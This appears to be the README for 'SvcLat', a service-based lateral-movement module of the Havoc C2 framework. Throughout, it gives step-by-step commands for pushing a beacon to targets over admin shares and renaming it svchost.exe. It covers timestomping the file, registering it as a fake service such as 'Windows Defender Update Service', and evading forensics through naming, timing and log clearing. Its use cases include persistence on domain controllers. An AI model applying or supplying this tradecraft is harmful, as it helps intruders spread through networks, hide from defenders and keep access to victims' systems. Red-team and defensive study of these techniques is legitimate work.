# SvcLat - Service-Based Lateral Movement Tool

## 📋 Overview

SvcLat (Service Lateral Movement) is a specialized lateral movement tool within the Havoc C2 framework that focuses specifically on Windows service-based lateral movement techniques. It provides a comprehensive 5-step workflow for deploying, managing, and cleaning up service-based payloads across multiple target systems with built-in evasion capabilities.

## 🎯 Key Features

### **5-Step Service Deployment Process**
SvcLat implements a complete service lifecycle management workflow:

1. **📤 Upload**: Deploy service executable to target systems
2. **⏰ Timestamp**: Modify file timestamps for evasion
3. **🔧 Service Creation**: Create Windows service with realistic configurations
4. **▶️ Service Control**: Start, stop, and query service status
5. **🧹 Cleanup**: Remove service and associated files

### **Realistic Service Name Generation**
- **Built-in Service Names**: Library of legitimate Windows service names
- **Realistic Descriptions**: Corresponding service descriptions for stealth
- **Evasion-Focused**: Names designed to blend with legitimate services
- **Customizable**: Option to specify custom service names

### **Advanced Timestomping**
- **Creation Time**: Modify file creation timestamp
- **Access Time**: Set last accessed timestamp  
- **Modify Time**: Control last modified timestamp
- **Evasion Technique**: Avoid temporal detection methods

### **UNC Path Automation**
- **Automatic Conversion**: Converts local paths to UNC paths
- **Share Mapping**: Handles administrative share access
- **Path Validation**: Ensures proper UNC format
- **Multi-Target Support**: Scales across multiple systems

### **Comprehensive Progress Tracking**
- **Step-by-Step Status**: Visual progress for each operation
- **Real-time Updates**: Live status monitoring
- **Error Handling**: Detailed error reporting and recovery
- **Result Logging**: Complete execution audit trail

## 🚀 Service Deployment Workflow

### **Step 1: File Upload**
```bash
# Upload payload to target system
upload payload.exe \\target\c$\Windows\Temp\svchost.exe

# Automatic UNC conversion
Local Path: C:\Windows\Temp\service.exe
UNC Path: \\192.168.1.10\c$\Windows\Temp\service.exe

# Upload verification
- File transfer completion
- File size validation  
- Access permissions check
```

### **Step 2: Timestamp Manipulation**
```bash
# Modify file timestamps for evasion
timestamp \\target\c$\Windows\Temp\svchost.exe "01/15/2023 10:30:00" "01/15/2023 10:30:00" "01/15/2023 10:30:00"

# Timestamp Options
Creation Time: When file was created
Access Time: When file was last accessed
Modify Time: When file was last modified

# Evasion Benefits
- Avoid timeline analysis
- Blend with legitimate files
- Defeat temporal forensics
```

### **Step 3: Service Creation**
```bash
# Create Windows service with realistic configuration
sc_create ServiceName "C:\Windows\Temp\svchost.exe" "Service Description"

# Example Service Creation
Service Name: WinDefendUpdate
Display Name: Windows Defender Update Service
Description: Provides automatic updates for Windows Defender definitions
Binary Path: C:\Windows\Temp\svchost.exe
Start Type: Auto (Delayed Start)
```

### **Step 4: Service Management**
```bash
# Start the service
sc_start ServiceName

# Query service status
sc_query ServiceName

# Stop the service (when needed)
sc_stop ServiceName

# Service Status Monitoring
- Running: Service executing successfully
- Stopped: Service not currently running
- Failed: Service failed to start
```

### **Step 5: Cleanup Operations**
```bash
# Complete cleanup workflow
1. Stop service: sc_stop ServiceName
2. Delete service: sc_delete ServiceName  
3. Remove file: remove \\target\c$\Windows\Temp\svchost.exe

# Cleanup Verification
- Service removal confirmation
- File deletion verification
- Registry cleanup validation
```

## 🎭 Built-in Service Names

### **Windows Update Services**
```bash
WinDefendUpdate: "Windows Defender Update Service"
WinUpdateHelper: "Windows Update Helper Service"  
DefenderHelper: "Windows Defender Helper Service"
UpdateSvcHost: "Windows Update Service Host"
SystemUpdateSvc: "System Update Service"
```

### **System Services**
```bash
SysHealthMon: "System Health Monitoring Service"
NetFrameworkOpt: ".NET Framework Optimization Service"
SystemDiagSvc: "System Diagnostics Service"
WinDiagnostic: "Windows Diagnostic Service"
SysMaintenanceSvc: "System Maintenance Service"
```

### **Security Services**
```bash
SecUpdateSvc: "Security Update Service"
AuthHelperSvc: "Authentication Helper Service"  
CertMgrHelper: "Certificate Manager Helper"
TrustVerifySvc: "Trust Verification Service"
PolicyEnforceSvc: "Policy Enforcement Service"
```

### **Network Services**
```bash
NetConnHelper: "Network Connection Helper"
WiFiConfigSvc: "WiFi Configuration Service"
NetworkDiscSvc: "Network Discovery Service"
ProxyMgrSvc: "Proxy Manager Service"
VPNHelperSvc: "VPN Helper Service"
```

## 🛠️ Technical Implementation

### **Command Structure**
```bash
# Upload Command
upload <local_file> <target_unc_path>

# Timestamp Command  
timestamp <target_file> <creation_time> <access_time> <modify_time>

# Service Commands
sc_create <service_name> <binary_path> <description>
sc_start <service_name>
sc_stop <service_name>
sc_query <service_name>
sc_delete <service_name>

# File Operations
remove <target_file>
```

### **UNC Path Conversion**
```cpp
// Automatic path conversion logic
QString localPath = "C:\\Windows\\Temp\\payload.exe";
QString targetIP = "192.168.1.10";

// Converts to: \\192.168.1.10\c$\Windows\Temp\payload.exe
QString uncPath = QString("\\\\%1\\%2$\\%3")
    .arg(targetIP)
    .arg(localPath.mid(0,1).toLower())  // Drive letter
    .arg(localPath.mid(3));             // Path without drive
```

### **Service Configuration**
```cpp
// Service creation parameters
struct ServiceConfig {
    QString serviceName;        // Unique service identifier
    QString displayName;        // User-friendly name
    QString description;        // Service description
    QString binaryPath;         // Executable path
    QString startType;          // Auto, Manual, Disabled
    QString serviceType;        // Own process, shared process
    QString errorControl;       // Normal, severe, critical
};
```

## 📊 Execution Results

### **Progress Tracking Table**
| Step | Operation | Status | Details |
|------|-----------|--------|---------|
| 1 | Upload | ✅ Success | File uploaded: 2.5MB |
| 2 | Timestamp | ✅ Success | Times modified |
| 3 | Service Create | ✅ Success | Service: WinDefendUpdate |
| 4 | Service Start | ✅ Success | PID: 3456 |
| 5 | Cleanup | ⏳ Pending | Awaiting execution |

### **Status Indicators**
- **✅ Success**: Operation completed successfully
- **❌ Failed**: Operation failed with error
- **⏳ In Progress**: Currently executing
- **⏸️ Pending**: Queued for execution
- **🔄 Retry**: Attempting retry after failure

## ⚙️ Advanced Configuration

### **File Upload Settings**
```bash
# Upload Configuration
Source File: C:\Payloads\beacon.exe
Target Directory: C:\Windows\Temp\
Target Filename: svchost.exe (renamed for stealth)
Overwrite Existing: Yes/No
Verify Upload: Checksum validation
```

### **Timestamp Configuration**
```bash
# Timestamp Settings
Creation Time: 2023-01-15 10:30:00
Access Time: 2023-01-15 10:30:00
Modify Time: 2023-01-15 10:30:00

# Common Timestamp Strategies
Windows Install Date: Blend with OS installation
System File Dates: Match existing system files
Recent Activity: Use recent but not current times
```

### **Service Configuration**
```bash
# Service Settings
Service Name: [Auto-generated or custom]
Display Name: [Realistic Windows service name]
Description: [Legitimate service description]
Start Type: Automatic (Delayed Start) [Recommended]
Service Account: LocalSystem [Default]
Dependencies: None [Avoid complex dependencies]
```

### **Cleanup Configuration**
```bash
# Cleanup Options
Stop Service: Yes [Always recommended]
Delete Service: Yes [Remove from registry]
Remove Files: Yes [Delete uploaded payload]
Clear Logs: Optional [Attempt log clearing]
Verify Cleanup: Yes [Confirm removal]
```

## 🛡️ OPSEC Considerations

### **Service Naming Strategy**
```bash
# Best Practices
✅ Use built-in realistic names
✅ Match naming conventions (CamelCase, descriptive)
✅ Include version numbers or updates in name
✅ Use legitimate Microsoft-style descriptions

❌ Avoid obviously malicious names
❌ Don't use random characters or numbers
❌ Avoid names that might conflict with real services
❌ Don't use company-specific names unless targeted
```

### **Timing Considerations**
```bash
# Execution Timing
Business Hours: Execute during normal work hours
Maintenance Windows: Use scheduled maintenance times  
Delayed Start: Use delayed start to avoid boot-time scrutiny
Cleanup Timing: Clean up after objectives achieved
```

### **File Placement**
```bash
# Recommended Directories
C:\Windows\Temp\: Temporary files (cleaned regularly)
C:\Windows\System32\: System directory (high privilege)
C:\Windows\SysWOW64\: 32-bit compatibility (less monitored)
C:\ProgramData\: Application data (varied files)

# Avoid These Locations
Desktop: Highly visible to users
Downloads: Suspicious for services
Program Files: Requires installer legitimacy
```

### **Detection Avoidance**
```bash
# Anti-Detection Techniques
1. Realistic service names and descriptions
2. Proper timestamp manipulation
3. Standard Windows service configuration
4. Appropriate file locations
5. Normal service startup timing
6. Complete cleanup after use
```

## 🎯 Red Team Use Cases

### **Initial Network Expansion**
```bash
# Scenario: Single compromised admin account
1. Upload beacon to multiple workstations
2. Create persistent service access
3. Establish multiple network footholds  
4. Maintain presence during investigation
```

### **Server Infrastructure Access**
```bash
# Scenario: Workstation to server movement
1. Target server systems with admin credentials
2. Deploy service-based persistence
3. Access sensitive server resources
4. Establish long-term server presence
```

### **Domain Controller Targeting**
```bash
# Scenario: Domain admin credential compromise
1. Target domain controllers with service deployment
2. Establish persistence on critical infrastructure
3. Monitor domain administrative activity
4. Maintain access to crown jewels
```

### **Backup Access Establishment**
```bash
# Scenario: Primary access vector at risk
1. Deploy backup access via services
2. Create multiple persistence mechanisms
3. Distribute across network infrastructure
4. Ensure operational continuity
```

## 📈 Integration with Havoc

### **Multi-Target Execution**
- **Bulk Operations**: Execute across multiple targets simultaneously
- **Credential Reuse**: Apply stored credentials across targets
- **Progress Monitoring**: Track status across all targets
- **Error Handling**: Graceful failure handling per target

### **Beacon Coordination**
```bash
# Service Beacon Integration
1. Upload Havoc beacon as service payload
2. Configure beacon for service execution
3. Establish new beacon sessions on targets
4. Manage multiple beacons through ControlFreak
```

### **Credential Manager Integration**
```bash
# Credential Workflow
1. Use stored admin credentials for service deployment
2. Target systems where credentials have access
3. Expand access through service persistence
4. Store newly discovered service account credentials
```

## 🔍 Troubleshooting

### **Upload Failures**
```bash
# Common Issues
Access Denied: Check admin credentials and SMB access
Network Path Not Found: Verify target connectivity  
File Already Exists: Enable overwrite or use different name
Insufficient Space: Check target disk space

# Solutions
- Verify administrative privileges
- Test SMB connectivity (port 445)
- Check Windows Firewall rules
- Validate UNC path format
```

### **Service Creation Failures**
```bash
# Common Issues  
Service Already Exists: Use unique service name
Invalid Binary Path: Verify file uploaded successfully
Access Denied: Ensure admin privileges for service creation
Invalid Service Name: Check name format and length

# Solutions
- Generate unique service names
- Verify file permissions and location
- Check Service Control Manager access
- Validate service configuration parameters
```

### **Service Start Failures**
```bash
# Common Issues
Binary Not Found: File may not have uploaded correctly
Access Denied: Service account lacks execution privileges
Dependency Failed: Service dependencies not met
Invalid Executable: File corruption during upload

# Solutions
- Re-upload payload with verification
- Check service account privileges
- Simplify service dependencies  
- Validate executable integrity
```

---

## 🔐 Security Best Practices

### **Operational Security**
- Use legitimate-looking service names and descriptions
- Implement proper timestamp manipulation
- Clean up thoroughly after operations
- Monitor for defensive responses

### **Credential Management**
- Use dedicated service accounts when possible
- Rotate credentials between operations
- Monitor for account lockouts or restrictions
- Maintain credential operational security

### **Network Hygiene**
- Minimize persistent services where possible
- Remove temporary files and artifacts
- Monitor for defensive service enumeration
- Coordinate with team for detection avoidance

---

*SvcLat provides comprehensive service-based lateral movement capabilities with built-in evasion techniques, realistic service generation, and complete lifecycle management, making it essential for stealthy network expansion during red team operations.*